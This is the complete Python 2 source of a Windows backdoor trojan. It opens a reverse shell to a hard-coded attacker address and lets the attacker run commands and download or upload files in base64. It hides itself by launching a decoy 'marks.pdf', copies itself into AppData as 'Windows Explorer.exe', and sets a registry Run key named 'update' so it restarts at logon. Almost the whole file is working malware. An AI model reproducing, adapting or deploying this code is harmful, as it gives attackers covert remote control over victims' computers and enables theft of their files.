#!/usr/bin/env python
# python 2
import sys
import socket
import subprocess
import json
import os
import base64
import shutil


class Backdoor:
    def __init__(self, ip, port):
        self.become_persis()
        # create instance
        # arguments are address families
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # to connect  IP and port to connect to
        # connect take tuple thus 2 brackets
        self.connection.connect((ip, port))

    def become_persis(self):
        # to make backdoor self persistent
        evil_file_loc = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_loc):
            shutil.copyfile(sys.executable, evil_file_loc)
            subprocess.call(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_loc + '"',
                shell=True)

    def rel_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def rel_rec(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def exec_sys_cmd(self, cmd):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(cmd, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def cng_work_dir(sel, path):
        os.chdir(path)
        return "[+] changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def writ_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] uploaded successful"

    def run(self):
        # to send
        # connection.send("\n[+]Connection established.\n")
        # to recieve
        while True:
            cmd = self.rel_rec()
            try:
                if cmd[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif cmd[0] == "cd" and len(cmd) > 1:
                    cmd_rslt = self.cng_work_dir(cmd[1])
                elif cmd[0] == "download":
                    cmd_rslt = self.read_file(cmd[1])
                elif cmd[0] == "upload":
                    cmd_rslt = self.writ_file(cmd[1], cmd[2])
                else:
                    cmd_rslt = self.exec_sys_cmd(cmd)
            except Exception:
                cmd_rslt = "[-] Error during execution!"
            self.rel_send(cmd_rslt)


# to run front file
file_name= sys._MEIPASS + "\marks.pdf"
subprocess.Popen(file_name, shell=True)

# IP of attacker, port
try:
    myback = Backdoor("192.168.1.8", 4444)
    myback.run()
except Exception:
    sys.exit()
